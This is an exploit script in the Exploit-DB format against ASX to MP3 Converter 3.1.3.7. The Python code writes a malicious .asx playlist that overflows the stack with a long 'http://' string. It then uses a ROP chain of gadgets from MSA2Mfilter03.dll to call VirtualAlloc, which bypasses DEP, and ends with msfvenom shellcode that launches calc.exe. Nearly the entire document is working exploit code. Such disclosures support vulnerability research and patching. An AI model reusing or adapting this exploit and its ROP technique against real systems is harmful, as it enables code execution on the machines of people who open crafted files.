# Exploit Title: ASX to MP3 converter 3.1.3.7 - '.asx' Local Stack Overflow (DEP)
# Google Dork: N/A
# Date: 2019-10-06
# Exploit Author: max7253
# Vendor Homepage: http://www.mini-stream.net/
# Software Link: https://www.exploit-db.com/apps/f4da5b43ca4b035aae55dfa68daa67c9-ASXtoMP3Converter.exe
# Version: 3.1.3.7.2010.11.05
# Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, x64-based PC
# CVE : N/A

# Note: There is a similar exploit published but it doesn't work in the OS I used:
# https://www.exploit-db.com/exploits/42963
# This exploit in the ROP chain uses addresses from ASLR modules. Not sure what OS that exploit was tested on.


import struct
file = 'fuzz_rop.asx'
#Tested on
#OS Name:                   Microsoft Windows 7 Enterprise
#OS Version:                6.1.7601 Service Pack 1 Build 7601
#System Type:               x64-based PC

#msfvenom -p windows/exec cmd=calc.exe -a x86 -b '\x00\x09\x0a' -f python
buf =  b""
buf += b"\xda\xd7\xbf\xf1\xca\xd1\x3f\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x31\x83\xc2\x04\x31\x7a\x14\x03\x7a\xe5\x28"
buf += b"\x24\xc3\xed\x2f\xc7\x3c\xed\x4f\x41\xd9\xdc\x4f\x35"
buf += b"\xa9\x4e\x60\x3d\xff\x62\x0b\x13\x14\xf1\x79\xbc\x1b"
buf += b"\xb2\x34\x9a\x12\x43\x64\xde\x35\xc7\x77\x33\x96\xf6"
buf += b"\xb7\x46\xd7\x3f\xa5\xab\x85\xe8\xa1\x1e\x3a\x9d\xfc"
buf += b"\xa2\xb1\xed\x11\xa3\x26\xa5\x10\x82\xf8\xbe\x4a\x04"
buf += b"\xfa\x13\xe7\x0d\xe4\x70\xc2\xc4\x9f\x42\xb8\xd6\x49"
buf += b"\x9b\x41\x74\xb4\x14\xb0\x84\xf0\x92\x2b\xf3\x08\xe1"
buf += b"\xd6\x04\xcf\x98\x0c\x80\xd4\x3a\xc6\x32\x31\xbb\x0b"
buf += b"\xa4\xb2\xb7\xe0\xa2\x9d\xdb\xf7\x67\x96\xe7\x7c\x86"
buf += b"\x79\x6e\xc6\xad\x5d\x2b\x9c\xcc\xc4\x91\x73\xf0\x17"
buf += b"\x7a\x2b\x54\x53\x96\x38\xe5\x3e\xfc\xbf\x7b\x45\xb2"
buf += b"\xc0\x83\x46\xe2\xa8\xb2\xcd\x6d\xae\x4a\x04\xca\x40"
buf += b"\x01\x05\x7a\xc9\xcc\xdf\x3f\x94\xee\x35\x03\xa1\x6c"
buf += b"\xbc\xfb\x56\x6c\xb5\xfe\x13\x2a\x25\x72\x0b\xdf\x49"
buf += b"\x21\x2c\xca\x29\xa4\xbe\x96\x83\x43\x47\x3c\xdc"

payload = "http://"
payload += "A" * 17417 + struct.pack('<L', 0x1002D038) + "CCCC"

## Save allocation type (0x1000) in EDX
payload += struct.pack('<L', 0x10047F4D) # ADC EDX,ESI # POP ESI # RETN
payload += struct.pack('<L', 0x11111111)
payload += struct.pack('<L', 0x10029B8C) # XOR EDX,EDX # RETN
payload += struct.pack('<L', 0x1002D493) # POP EDX # RETN
payload += struct.pack('<L', 0xEEEEFEEF)
payload += struct.pack('<L', 0x10047F4D) # ADC EDX,ESI # POP ESI # RETN
payload += struct.pack('<L', 0x41414141)

## Save the address of VirtualAlloc() in ESI
payload += struct.pack('<L', 0x1002fade) # POP EAX # RETN [MSA2Mfilter03.dll] 
payload += struct.pack('<L', 0x1004f060) # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
payload += struct.pack('<L', 0x1003239f) # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSA2Mfilter03.dll]
payload += struct.pack('<L', 0x10040754) # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN
payload += struct.pack('<L', 0x41414141)
payload += struct.pack('<L', 0x41414141)

## Save the size of the block in EBX
payload += struct.pack('<L', 0x1004d881) # XOR EAX,EAX # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x1003b34d) # ADD EAX,29 # RETN
payload += struct.pack('<L', 0x10034735) # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN

## Save the address of (# ADD ESP,8 # RETN) in EBP
payload += struct.pack('<L', 0x10031c6c) # POP EBP # RETN
payload += struct.pack('<L', 0x10012316) # ADD ESP,8 # RETN
#payload += struct.pack('<L', 0x1003df73) # & PUSH ESP # RETN

## Save memory protection code (0x40) in ECX
payload += struct.pack('<L', 0x1002ca22) # POP ECX # RETN
payload += struct.pack('<L', 0xFFFFFFFF)
payload += struct.pack('<L', 0x10031ebe) # INC ECX # AND EAX,8 # RETN
payload += struct.pack('<L', 0x10031ebe) # INC ECX # AND EAX,8 # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN
payload += struct.pack('<L', 0x1002a5b7) # ADD ECX,ECX # RETN

## Save ROP-NOP in EDI
payload += struct.pack('<L', 0x1002e346) # POP EDI # RETN
payload += struct.pack('<L', 0x1002D038) # RETN

## Save NOPs in EAX
#payload += struct.pack('<L', 0x1003bca4) # POP EAX # RETN [MSA2Mfilter03.dll] 
#payload += struct.pack('<L', 0x90909090) # nop

## Set up the EAX register to contain the address of # PUSHAD #RETN and JMP to this address
payload += struct.pack('<L', 0x1002E516) # POP EAX # RETN
payload += struct.pack('<L', 0xA4E2F275)
payload += struct.pack('<L', 0x1003efe2) # ADD EAX,5B5D5E5F # RETN
payload += struct.pack('<L', 0x10040ce5) # PUSH EAX # RETN

payload += "\x90" * 4
payload += struct.pack('<L', 0x1003df73) # & PUSH ESP # RETN
payload += "\x90" * 20
payload += buf

f = open(file,'w')
f.write(payload)
f.close()